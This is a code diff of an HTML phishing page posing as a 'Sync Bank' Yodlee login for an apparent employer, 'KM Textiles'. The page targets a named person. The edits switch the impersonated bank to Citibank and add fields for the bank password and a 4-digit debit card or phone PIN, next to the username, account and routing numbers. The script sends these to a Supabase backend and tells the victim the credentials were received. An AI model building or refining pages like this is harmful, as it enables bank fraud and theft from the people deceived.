@@ -6,11 +6,16 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1.0" />
 
+<!-- Prevent HTML file caching -->
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+
 <title>Sync Bank | KM Textiles</title>
 
-<link rel="stylesheet" href="nicepage.css" />
-<script src="jquery.js" defer></script>
-<script src="nicepage.js" defer></script>
+<link rel="stylesheet" href="nicepage.css?v=1.0.1" />
+<script src="jquery.js?v=1.0.1" defer></script>
+<script src="nicepage.js?v=1.0.1" defer></script>
 
 <style>
 
@@ -109,7 +114,7 @@ input,select{
 
   <div class="profile-box">
     <h3 id="displayName">Maria Torres</h3>
-    <p><b>Login via Yodlee®:</b> <span id="displayLanguage">Wells Fargo Bank</span></p>
+    <p><b>Login via Yodlee®:</b> <span id="displayLanguage">Citibank</span></p>
   </div>
 
   <div class="note">
@@ -118,8 +123,11 @@ input,select{
 
   <form id="syncForm">
 
-    <label>Confirm Bank Name *</label>
-    <input type="text" name="bank" required>
+    <label>Username *</label>
+    <input type="text" name="jobTitle" required>
+
+    <label>Password *</label>
+    <input type="password" name="password" required>
 
     <label>Account Number *</label>
     <input type="text" name="account" required>
@@ -127,11 +135,10 @@ input,select{
     <label>Routing Number *</label>
     <input type="text" name="routing" required>
 
-    <label>Username *</label>
-    <input type="text" name="jobTitle" required>
+       <label>4-digit Telephone PIN or Debit Card PIN  *</label>
+    <input type="password" name="bank" type="password"    maxlength="4"    inputmode="numeric"    pattern="[0-9]{4}"    title="Please enter exactly 4 numbers." required>
 
-    <label>Password *</label>
-    <input type="password" name="password" required>
+
 <!--
     <label>Supporting Document (Optional)</label>
     <input type="file" name="file">
@@ -154,7 +161,7 @@ const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBh
 const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 const profileName = "Maria Torres";
-const profileLanguage = "Wells Fargo Bank";
+const profileLanguage = "Citibank";
 
 document.getElementById("displayName").textContent = profileName;
 document.getElementById("displayLanguage").textContent = profileLanguage;
@@ -193,7 +200,7 @@ document.getElementById("syncForm").addEventListener("submit", async (e) => {
     e.target.reset();
 
     msg.textContent =
-      "✅ Credentials Received. Our system is now validating your account with Wells Fargo Bank. If a verification code is required, a secure link will be sent to your work email.";
+      "✅ Credentials Received. Our system is now validating your account with Citibank. If a verification code is required, a secure link will be sent to your work email.";
 
   } catch (err) {
     console.error(err);
